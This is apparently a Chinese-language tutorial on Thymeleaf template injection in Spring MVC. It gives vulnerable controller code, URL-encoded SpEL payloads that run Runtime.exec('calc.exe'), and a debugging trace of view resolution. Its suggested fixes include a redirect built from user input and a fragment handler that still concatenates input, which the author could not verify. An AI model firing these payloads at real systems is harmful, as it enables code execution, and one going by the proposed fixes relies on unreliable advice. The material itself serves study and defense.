### 应用场景

* thymeleaf有几个典型的应用场景，这几个场景也伴容易产生模板注入

#### 选择模板

* 场景：例如，国际化语言切换。定义 CN 模板和 EN 模板，通过修改 lang 的参数来实现中英文页面展示

* 访问/path?lang=，lang作为模板路径的一部分拼接

```java
    public String path(@RequestParam String lang) {
        return "user/" + lang + "/welcome"; //template path is tainted
    }
```

* payload：/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x

#### 片段选择器

* 场景：在thymeleaf的模板文件中，可以自定义片段，在其他模板文件中可以对这些片段进行引用和复用。下面的例子在header.html中定义了名为header的片段，在home.html进行了引用。这种设计在**页面局部刷新**、**动态内容加载**等场景下经常使用。

```html
<!-- 模板文件：header.html -->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>My Website</title>
</head>
<body>
    <!-- 定义头部片段 -->
    <div th:fragment="header">
        <header>
            <h1>Welcome to My Website</h1>
            <nav>
                <ul>
                    <li><a th:href="@{/home}">Home</a></li>
                    <li><a th:href="@{/about}">About</a></li>
                    <li><a th:href="@{/contact}">Contact</a></li>
                </ul>
            </nav>
        </header>
    </div>
</body>
</html>
```

```html
<!-- 模板文件：home.html -->
<!DOCTYPE html>
<html xmlns:th="http://www.thymeleaf.org">
<head>
    <title>Home Page</title>
</head>
<body>
    <!-- 引用头部片段 -->
    <div th:replace="fragments/header :: header"></div>

    <!-- 页面内容 -->
    <div>
        <p>This is the home page content.</p>
        <!-- 其他页面内容 -->
    </div>
</body>
</html>
```

* 代码return "welcome : :"+section ，welcome是模板文件的文件名，而section则动态选择了一个片段，这段代码动态地返回了welcome模板文件的某个片段

```java
 @GetMapping("/fragment")
    public String fragment(@RequestParam String section) {
        return "welcome :: " + section;
    }
```

* payload:/fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()%7d__::.x

#### 拼接路径

* 场景：和选择模板类似

```java
@GetMapping("/doc/{document}")
    public void getDocument(@PathVariable String document) {
        log.info("Retrieving " + document);
        //returns void, so view name is taken from URI
    }
```

* payload: /doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc.exe").getInputStream()).next()%7d__::.x

### 漏洞分析

#### SpringMVC视图解析过程

* 调试记录：在return "welcome :: " + section;下断点，step into，注意这是一个层层return的过程而不是正向调用的过程

  * InvocableHandlerMethod.java#doInvoke{... return  getBridgedMethod().invoke(getBean(), args);...}`doInvoke` 方法是 `InvocableHandlerMethod` 中用于实际调用处理方法的地方。在这里，`getBridgedMethod().invoke(getBean(), args)` 调用了被代理的控制器方法。**注意args是http请求中的参数包含section**
  * InvocableHandlerMethod.java#invokeForRequest{... return Invoke(args); ...}调用了被代理的控制器方法**args参数同上**
  * ServletInvocableHandlerMethod#invokeAndHandle{。。。Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs); 。。。}**returnValue为调用Controller的结果，传入section=header，这里的值为welcome :: header**
  * 中间还有一些其它代码跳过了，现在专注于returnValue的传递

  ```java
  public void invokeAndHandle(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception {
          //调用Controller后获取返回值到returnValue中
          Object returnValue = this.invokeForRequest(webRequest, mavContainer, providedArgs);
          this.setResponseStatus(webRequest);
          //判断returnValue是否为空
          if (returnValue == null) {
              //判断RequestHandled是否为True
              if (this.isRequestNotModified(webRequest) || this.getResponseStatus() != null || mavContainer.isRequestHandled()) {
                  this.disableContentCachingIfNecessary(webRequest);
                  //设置RequestHandled属性
                  mavContainer.setRequestHandled(true);
                  return;
              }
          } else if (StringUtils.hasText(this.getResponseStatusReason())) {
              mavContainer.setRequestHandled(true);
              return;
          }
          mavContainer.setRequestHandled(false);
          Assert.state(this.returnValueHandlers != null, "No return value handlers");
          try {
          //通过handleReturnValue根据返回值的类型和返回值将不同的属性设置到ModelAndViewContainer中。
              this.returnValueHandlers.handleReturnValue(returnValue, this.getReturnValueType(returnValue), mavContainer, webRequest);
          } catch (Exception var6) {
              if (logger.isTraceEnabled()) {
                  logger.trace(this.formatErrorForReturnValue(returnValue), var6);
              }
              throw var6;
          }
  ```

  * 这里关注this.returnValueHandlers.handleReturnValue(returnValue, this.getReturnValueType(returnValue), mavContainer, webRequest);

  ```java
  @Override
  	public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType,
  			ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception {
  
  		HandlerMethodReturnValueHandler handler = selectHandler(returnValue, returnType);
  		if (handler == null) {
  			throw new IllegalArgumentException("Unknown return value type: " + returnType.getParameterType().getName());
  		}
  		handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);
  	}
  ```

  



### 漏洞修复

* 漏洞产生的核心原因是前端输入的不可信数据在后端作为视图路径的一部分进行解析，修复也很简单，就是不要将前端传入的参数作为视图路径的解析，对于之前介绍的集中有模板注入风险的写法用其他写法代替
* 网上广为流传的三种修复方式我实在是看不懂，它们说到底只是遵从了 “不将前端输入的不可信数据在后端作为视图路径的一部分进行解析”这一原则而已，真正的关键的是为那些为了实现功能违反安全原则的情景提出替代方案



* 选择模板、拼接路径的替代方案：不在后端做模板路径的解析，仅仅是产生url，让前端重定向访问该模板

```java
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
  return "redirect:" + url; //FP as redirects are not resolved asexpressions
}
```

* 片段选择：这里的做法是不解析模板路径，而直接以绝对路径解析模板内容，但我没有复现成功，不知道是版本问题还是设置问题，抑或说这个方法本身就是不合理的

```java
@Autowired
    private TemplateEngine templateEngine;

    @GetMapping("/getFragment")
    public ResponseEntity<String> getFragment(@RequestParam String fragmentName) {
        // 创建上下文，可以添加模型数据
        Context context = new Context();
        context.setVariable("data", "Hello from " + fragmentName + "!");

        // 使用Thymeleaf模板引擎处理模板
        String fragment = templateEngine.process("welcome :: "+ fragmentName, context);

        // 返回响应
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.TEXT_HTML);
        return new ResponseEntity<>(fragment, headers, HttpStatus.OK);
    }
```

